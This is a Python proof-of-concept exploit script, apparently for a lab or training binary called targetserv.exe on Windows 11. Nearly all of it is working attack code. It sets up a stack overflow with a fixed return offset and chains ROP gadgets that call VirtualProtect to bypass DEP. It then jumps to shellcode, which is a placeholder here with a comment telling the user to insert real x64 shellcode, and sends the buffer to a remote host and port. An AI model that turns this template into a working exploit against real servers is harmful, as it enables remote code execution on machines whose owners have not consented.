#!/usr/bin/python
#
# First POC Exploit for targetserv.exe (Tested on Windows 11 x64)
# The following POC is independent from the specific Windows version, since the ROP chain is based on gadgets from targetserv.exe.

from pwn import *
import sys
from struct import pack

# Dummy shellcode: replace with your x64 shellcode
shellcode = b"\x90" * 40 + b"\xcc" * 800

iatAddr = 0x4477204082a0
outputAddr = 0x00004477204030b8         # Used for lpflOldProtect parameter of VirtualProtect

vp  = pack('<Q', 0x4545454545454545)    # VMA of VirtualProtect
vp += pack('<Q', 0x4646464646464646)    # Return Address from VirtualProtect

rip_offset = 120
rip = pack('<Q', 0x447720401437)        # push rsp ; pop rcx ; ret ;

rop  = pack('<Q', 0x44772040203c)       # pop rax ; ret ;
rop += pack('<Q', iatAddr + 72)         # VMA of IAT location containing VP's VMA
rop += pack('<Q', 0x4477204029c7)       # mov rax, qword [rax] ; ret ; -> RAX = VMA of VP
rop += pack('<Q', 0x447720401465)       # mov r10, rax ; ret ; -> R10 = VMA of VP
rop += pack('<Q', 0x44772040143e)       # pop rbx ; ret ;
rop += pack('<Q', 0xfffffffffffffe90)   # -304 = offset to Shellcode 
rop += pack('<Q', 0x447720401458)       # sub rcx, rbx ; ret ; -> RCX = Shellcode Addr
rop += pack('<Q', 0x447720401460)       # xchg rax, rcx ; push rax ; pop rcx ; ret ; -> RAX = Shellcode Addr
rop += pack('<Q', 0x447720401469)       # mov r11, rax ; ret ; -> R11 = lpAddress = Shellcode Addr 
rop += pack('<Q', 0x44772040143e)       # pop rbx ; ret ;
rop += pack('<Q', 0xfffffffffffffce0)   # -800
rop += pack('<Q', 0x447720401450)       # neg rbx ; ret ; -> RBX = 800
rop += pack('<Q', 0x447720401444)       # mov rdx, rbx ; ret ; -> RDX = dwSize = 800
rop += pack('<Q', 0x44772040143e)       # pop rbx ; ret ;
rop += pack('<Q', 0xffffffffffffffc0)   # -0x40
rop += pack('<Q', 0x447720401450)       # neg rbx ; ret ; -> RBX = 0x40
rop += pack('<Q', 0x447720401448)       # mov r8, rbx ; ret ; -> R8 = flNewProtect = 0x40
rop += pack('<Q', 0x44772040143e)       # pop rbx ; ret ;
rop += pack('<Q', outputAddr)           # Writable unused address
rop += pack('<Q', 0x44772040144c)       # mov r9, rbx ; ret ; -> rR9 = lpflOldProtect
rop += pack('<Q', 0x447720401437)       # push rsp ; pop rcx ; ret ;
rop += pack('<Q', 0x44772040143e)       # pop rbx ; ret ;
rop += pack('<Q', 0xffffffffffffff40)   # -192 = offset to VP Skeleton
rop += pack('<Q', 0x447720401454)       # add rcx, rbx ; ret ; -> RCX = VP Skeleton
rop += pack('<Q', 0x447720401460)       # xchg rax, rcx ; push rax ; pop rcx ; ret ; -> RAX = VP Skeleton
rop += pack('<Q', 0x447720401475)       # mov rcx, r10 ; ret ; -> RCX = VMA of VP
rop += pack('<Q', 0x44772040145c)       # mov qword [rax], rcx ; ret ; -> Patch VMA of VP
rop += pack('<Q', 0x44772040147d)       # inc rax ; ret ;
rop += pack('<Q', 0x44772040147d)       # inc rax ; ret ;
rop += pack('<Q', 0x44772040147d)       # inc rax ; ret ;
rop += pack('<Q', 0x44772040147d)       # inc rax ; ret ;
rop += pack('<Q', 0x44772040147d)       # inc rax ; ret ;
rop += pack('<Q', 0x44772040147d)       # inc rax ; ret ;
rop += pack('<Q', 0x44772040147d)       # inc rax ; ret ;
rop += pack('<Q', 0x44772040147d)       # inc rax ; ret ;
rop += pack('<Q', 0x447720401479)       # mov rcx, r11 ; ret ; -> RCX = Return Addr = Shellcode Addr
rop += pack('<Q', 0x44772040145c)       # mov qword [rax], rcx ; ret ; -> Patch Return Addr of VP 
rop += pack('<Q', 0x447720401481)       # dec rax ; ret ;
rop += pack('<Q', 0x447720401481)       # dec rax ; ret ;
rop += pack('<Q', 0x447720401481)       # dec rax ; ret ;
rop += pack('<Q', 0x447720401481)       # dec rax ; ret ;
rop += pack('<Q', 0x447720401481)       # dec rax ; ret ;
rop += pack('<Q', 0x447720401481)       # dec rax ; ret ;
rop += pack('<Q', 0x447720401481)       # dec rax ; ret ;
rop += pack('<Q', 0x447720401481)       # dec rax ; ret ; -> RAX = VP Skeleton
rop += pack('<Q', 0x447720401485)       # xchg rax, rsp ; ret ;

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <server> <port>")
        sys.exit(1)
    
    server = sys.argv[1]
    port = int(sys.argv[2])
    
    buffer = b"A" * (rip_offset - len(vp)) + vp + rip + rop + shellcode
    
    try:
        conn = remote(server, port)
        print(f"[+] Connected to {server}:{port}")
        
        conn.send(buffer)
        print("[+] Buffer sent successfully!")
        
        conn.close()
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()